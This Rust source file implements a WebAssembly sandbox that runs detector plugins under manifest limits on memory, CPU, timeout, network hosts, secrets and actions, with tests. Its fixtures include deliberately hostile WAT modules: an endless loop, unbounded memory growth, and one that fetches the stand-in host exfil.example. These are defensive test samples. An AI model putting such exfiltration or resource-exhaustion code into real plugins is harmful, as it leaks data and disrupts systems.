//! The WebAssembly sandbox for parser, detector and enricher plugins.
//!
//! Plugin ABI (the same JSON ABI as the core's C ABI):
//!   exports: memory, ivar_alloc(len) -> ptr, ivar_plugin_call(ptr, len) -> packed u64
//!   imports (module "ivar"):
//!     log(ptr, len)
//!     http_fetch(ptr, len) -> packed u64   request {"url": "https://host:port/path", "method": "GET", "body": ""}
//!     secret(ptr, len) -> packed u64       request {"name": "okta_api_token"}
//!     action(ptr, len) -> i32              request {"action": "session.revoke", "target": "..."}
//!
//! Limits from the manifest: memory_mb through the store limiter,
//! cpu_ms_per_call as fuel, timeout_ms as a wall clock check on the call and
//! on every host call. Any request for undeclared network, secret or action
//! access fails the call with `UndeclaredAccess`, and the registry disables
//! the plugin.

use crate::permissions::network_matches;
use ivar_contracts::PluginManifest;
use std::collections::BTreeMap;
use std::time::{Duration, Instant};
use wasmi::{Caller, Config, Engine, Extern, Linker, Memory, Module, Store, StoreLimits, StoreLimitsBuilder};

/// Fuel units per millisecond of CPU budget (calibrated for the wasmi interpreter).
pub const FUEL_PER_MS: u64 = 200_000;

#[derive(Debug, Clone, PartialEq, thiserror::Error)]
pub enum SandboxError {
    #[error("plugin crashed: {0}")]
    Crash(String),
    #[error("plugin exceeded its CPU limit")]
    CpuLimit,
    #[error("plugin exceeded its memory limit")]
    MemoryLimit,
    #[error("plugin exceeded its timeout")]
    Timeout,
    #[error("plugin requested undeclared access: {0}")]
    UndeclaredAccess(String),
    #[error("plugin is malformed: {0}")]
    Malformed(String),
}

/// What the host lets plugins reach, behind the manifest checks.
pub trait HostServices {
    fn fetch(&mut self, method: &str, url: &str, body: &str) -> Result<String, String>;
    fn secret(&mut self, name: &str) -> Option<String>;
    fn action(&mut self, action: &str, target: &str) -> bool;
}

/// No network, no secrets, actions only recorded. Used for shadow mode.
#[derive(Default)]
pub struct InertServices {
    pub actions: Vec<(String, String)>,
}

impl HostServices for InertServices {
    fn fetch(&mut self, _m: &str, _u: &str, _b: &str) -> Result<String, String> {
        Err("network disabled in shadow mode".into())
    }
    fn secret(&mut self, _n: &str) -> Option<String> {
        None
    }
    fn action(&mut self, a: &str, t: &str) -> bool {
        self.actions.push((a.into(), t.into()));
        true
    }
}

struct HostState {
    limits: StoreLimits,
    network: Vec<String>,
    secrets: Vec<String>,
    actions: Vec<String>,
    violation: Option<String>,
    deadline: Instant,
    logs: Vec<String>,
    services: Box<dyn HostServices>,
}

pub struct WasmPlugin {
    engine: Engine,
    module: Module,
    manifest: PluginManifest,
}

fn read(mem: &Memory, store: &impl wasmi::AsContext, ptr: i32, len: i32) -> Option<Vec<u8>> {
    let data = mem.data(store);
    let (p, l) = (ptr as u32 as usize, len as u32 as usize);
    data.get(p..p.checked_add(l)?).map(|s| s.to_vec())
}

/// Write a response into plugin memory through its own allocator.
fn write_back(caller: &mut Caller<'_, HostState>, bytes: &[u8]) -> i64 {
    let Some(Extern::Func(alloc)) = caller.get_export("ivar_alloc") else { return 0 };
    let Ok(alloc) = alloc.typed::<i32, i32>(&*caller) else { return 0 };
    let Ok(ptr) = alloc.call(&mut *caller, bytes.len() as i32) else { return 0 };
    let Some(Extern::Memory(mem)) = caller.get_export("memory") else { return 0 };
    if mem.write(&mut *caller, ptr as u32 as usize, bytes).is_err() {
        return 0;
    }
    ((ptr as u32 as i64) << 32) | bytes.len() as i64
}

fn request(caller: &mut Caller<'_, HostState>, ptr: i32, len: i32) -> serde_json::Value {
    let Some(Extern::Memory(mem)) = caller.get_export("memory") else { return serde_json::Value::Null };
    read(&mem, &*caller, ptr, len).and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or(serde_json::Value::Null)
}

fn host_port(url: &str) -> String {
    let rest = url.split("://").nth(1).unwrap_or(url);
    let authority = rest.split('/').next().unwrap_or("");
    if authority.contains(':') {
        authority.to_string()
    } else if url.starts_with("http://") {
        format!("{authority}:80")
    } else {
        format!("{authority}:443")
    }
}

impl WasmPlugin {
    pub fn load(manifest: &PluginManifest, bytes: &[u8]) -> Result<Self, SandboxError> {
        let mut cfg = Config::default();
        cfg.consume_fuel(true);
        let engine = Engine::new(&cfg);
        let module = Module::new(&engine, bytes).map_err(|e| SandboxError::Malformed(e.to_string()))?;
        Ok(WasmPlugin { engine, module, manifest: manifest.clone() })
    }

    pub fn manifest(&self) -> &PluginManifest {
        &self.manifest
    }

    /// One call with a fresh instance: no state leaks between calls.
    pub fn call(&self, input: &str, services: Box<dyn HostServices>) -> Result<(String, Vec<String>), SandboxError> {
        let l = &self.manifest.limits;
        let state = HostState {
            limits: StoreLimitsBuilder::new().memory_size((l.memory_mb as usize) << 20).trap_on_grow_failure(true).build(),
            network: self.manifest.permissions.network.clone(),
            secrets: self.manifest.permissions.secrets.clone(),
            actions: self.manifest.permissions.actions.clone(),
            violation: None,
            deadline: Instant::now() + Duration::from_millis(l.timeout_ms),
            logs: Vec::new(),
            services,
        };
        let mut store = Store::new(&self.engine, state);
        store.limiter(|s| &mut s.limits);
        store.set_fuel(l.cpu_ms_per_call.max(1) * FUEL_PER_MS).map_err(|e| SandboxError::Malformed(e.to_string()))?;
        let mut linker = <Linker<HostState>>::new(&self.engine);
        linker
            .func_wrap("ivar", "log", |mut c: Caller<'_, HostState>, ptr: i32, len: i32| {
                if let Some(Extern::Memory(m)) = c.get_export("memory") {
                    if let Some(b) = read(&m, &c, ptr, len) {
                        let line = String::from_utf8_lossy(&b).chars().take(1024).collect();
                        c.data_mut().logs.push(line);
                    }
                }
            })
            .map_err(|e| SandboxError::Malformed(e.to_string()))?;
        linker
            .func_wrap("ivar", "http_fetch", |mut c: Caller<'_, HostState>, ptr: i32, len: i32| -> i64 {
                let req = request(&mut c, ptr, len);
                let url = req.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let hp = host_port(&url);
                if !c.data().network.iter().any(|p| network_matches(p, &hp) || p == &hp) {
                    c.data_mut().violation = Some(format!("network {hp}"));
                    return 0;
                }
                if Instant::now() > c.data().deadline {
                    c.data_mut().violation = Some("timeout".into());
                    return 0;
                }
                let method = req.get("method").and_then(|v| v.as_str()).unwrap_or("GET").to_string();
                let body = req.get("body").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let out = match c.data_mut().services.fetch(&method, &url, &body) {
                    Ok(b) => serde_json::json!({ "ok": true, "body": b }),
                    Err(e) => serde_json::json!({ "ok": false, "error": e }),
                };
                write_back(&mut c, out.to_string().as_bytes())
            })
            .map_err(|e| SandboxError::Malformed(e.to_string()))?;
        linker
            .func_wrap("ivar", "secret", |mut c: Caller<'_, HostState>, ptr: i32, len: i32| -> i64 {
                let req = request(&mut c, ptr, len);
                let name = req.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string();
                if !c.data().secrets.contains(&name) {
                    c.data_mut().violation = Some(format!("secret {name}"));
                    return 0;
                }
                let v = c.data_mut().services.secret(&name).unwrap_or_default();
                write_back(&mut c, serde_json::json!({ "value": v }).to_string().as_bytes())
            })
            .map_err(|e| SandboxError::Malformed(e.to_string()))?;
        linker
            .func_wrap("ivar", "action", |mut c: Caller<'_, HostState>, ptr: i32, len: i32| -> i32 {
                let req = request(&mut c, ptr, len);
                let action = req.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let target = req.get("target").and_then(|v| v.as_str()).unwrap_or("").to_string();
                if !c.data().actions.contains(&action) {
                    c.data_mut().violation = Some(format!("action {action}"));
                    return 0;
                }
                c.data_mut().services.action(&action, &target) as i32
            })
            .map_err(|e| SandboxError::Malformed(e.to_string()))?;

        let instance = linker
            .instantiate(&mut store, &self.module)
            .and_then(|pre| pre.start(&mut store))
            .map_err(|e| SandboxError::Malformed(e.to_string()))?;
        let mem = instance.get_memory(&store, "memory").ok_or_else(|| SandboxError::Malformed("no memory export".into()))?;
        let alloc = instance.get_typed_func::<i32, i32>(&store, "ivar_alloc").map_err(|e| SandboxError::Malformed(e.to_string()))?;
        let entry = instance.get_typed_func::<(i32, i32), i64>(&store, "ivar_plugin_call").map_err(|e| SandboxError::Malformed(e.to_string()))?;
        let classify = |e: wasmi::Error, store: &Store<HostState>| -> SandboxError {
            if let Some(v) = &store.data().violation {
                return SandboxError::UndeclaredAccess(v.clone());
            }
            let s = e.to_string();
            if s.contains("fuel") {
                SandboxError::CpuLimit
            } else if s.contains("memory") || s.contains("grow") || s.contains("limit") {
                SandboxError::MemoryLimit
            } else {
                SandboxError::Crash(s)
            }
        };
        let ptr = alloc.call(&mut store, input.len() as i32).map_err(|e| classify(e, &store))?;
        mem.write(&mut store, ptr as u32 as usize, input.as_bytes()).map_err(|_| SandboxError::MemoryLimit)?;
        let started = Instant::now();
        let packed = entry.call(&mut store, (ptr, input.len() as i32)).map_err(|e| classify(e, &store))?;
        if let Some(v) = store.data().violation.clone() {
            return Err(if v == "timeout" { SandboxError::Timeout } else { SandboxError::UndeclaredAccess(v) });
        }
        if started.elapsed() > Duration::from_millis(l.timeout_ms) {
            return Err(SandboxError::Timeout);
        }
        let (out_ptr, out_len) = ((packed as u64 >> 32) as i32, (packed as u64 & 0xFFFF_FFFF) as i32);
        let out = read(&mem, &store, out_ptr, out_len).ok_or_else(|| SandboxError::Crash("result out of bounds".into()))?;
        let logs = std::mem::take(&mut store.data_mut().logs);
        Ok((String::from_utf8_lossy(&out).to_string(), logs))
    }
}

/// Map of secret name to value, for tests and simple deployments.
pub struct StaticServices {
    pub secrets: BTreeMap<String, String>,
    pub responses: BTreeMap<String, String>,
    pub actions: Vec<(String, String)>,
}

impl HostServices for StaticServices {
    fn fetch(&mut self, _m: &str, url: &str, _b: &str) -> Result<String, String> {
        self.responses.get(url).cloned().ok_or_else(|| "no response".into())
    }
    fn secret(&mut self, name: &str) -> Option<String> {
        self.secrets.get(name).cloned()
    }
    fn action(&mut self, a: &str, t: &str) -> bool {
        self.actions.push((a.into(), t.into()));
        true
    }
}

#[cfg(test)]
pub(crate) mod fixtures {
    /// A detector that returns one finding and logs a line.
    pub const GOOD: &str = r#"(module
      (import "ivar" "log" (func $log (param i32 i32)))
      (memory (export "memory") 1)
      (global $bump (mut i32) (i32.const 4096))
      (data (i32.const 1024) "[{\"rule\":\"fraud_velocity\",\"rule_family\":\"fraud.velocity\",\"confidence\":0.7,\"verdict\":\"suspicious\"}]")
      (data (i32.const 2048) "checked")
      (func (export "ivar_alloc") (param $n i32) (result i32)
        (local $p i32) (local.set $p (global.get $bump)) (global.set $bump (i32.add (global.get $bump) (local.get $n))) (local.get $p))
      (func (export "ivar_plugin_call") (param i32 i32) (result i64)
        (call $log (i32.const 2048) (i32.const 7))
        (i64.or (i64.shl (i64.const 1024) (i64.const 32)) (i64.const 98))))"#;

    /// A detector that never returns.
    pub const SPIN: &str = r#"(module (memory (export "memory") 1)
      (func (export "ivar_alloc") (param i32) (result i32) (i32.const 4096))
      (func (export "ivar_plugin_call") (param i32 i32) (result i64) (loop $l (br $l)) (i64.const 0)))"#;

    /// A detector that grows memory without bound.
    pub const HOG: &str = r#"(module (memory (export "memory") 1)
      (func (export "ivar_alloc") (param i32) (result i32) (i32.const 4096))
      (func (export "ivar_plugin_call") (param i32 i32) (result i64)
        (loop $l (drop (memory.grow (i32.const 16))) (br $l)) (i64.const 0)))"#;

    /// A detector that tries to reach a host its manifest does not declare.
    pub const SNEAKY: &str = r#"(module
      (import "ivar" "http_fetch" (func $fetch (param i32 i32) (result i64)))
      (memory (export "memory") 1)
      (data (i32.const 1024) "{\"url\":\"https://exfil.example:443/x\"}")
      (func (export "ivar_alloc") (param i32) (result i32) (i32.const 8192))
      (func (export "ivar_plugin_call") (param i32 i32) (result i64)
        (drop (call $fetch (i32.const 1024) (i32.const 37))) (i64.const 0)))"#;

    pub fn manifest(kind: &str) -> ivar_contracts::PluginManifest {
        ivar_contracts::PluginManifest::from_yaml(&format!(
            "name: test-{kind}\nversion: 1.0.0\ntype: detector\napi: ivar.plugin/v1\nlimits: {{ memory_mb: 2, cpu_ms_per_call: 20, timeout_ms: 2000 }}\nsignature: sigstore\n"
        ))
        .unwrap()
    }
}

#[cfg(test)]
mod tests {
    use super::fixtures::*;
    use super::*;

    fn run(wat_src: &str) -> Result<(String, Vec<String>), SandboxError> {
        let p = WasmPlugin::load(&manifest("t"), &wat::parse_str(wat_src).unwrap()).unwrap();
        p.call("{}", Box::new(InertServices::default()))
    }

    #[test]
    fn good_plugin_runs() {
        let (out, logs) = run(GOOD).unwrap();
        assert!(out.contains("fraud_velocity"));
        assert_eq!(logs, vec!["checked"]);
    }

    #[test]
    fn limits_and_access_are_enforced() {
        assert_eq!(run(SPIN).unwrap_err(), SandboxError::CpuLimit);
        assert_eq!(run(HOG).unwrap_err(), SandboxError::MemoryLimit);
        assert_eq!(run(SNEAKY).unwrap_err(), SandboxError::UndeclaredAccess("network exfil.example:443".into()));
    }
}
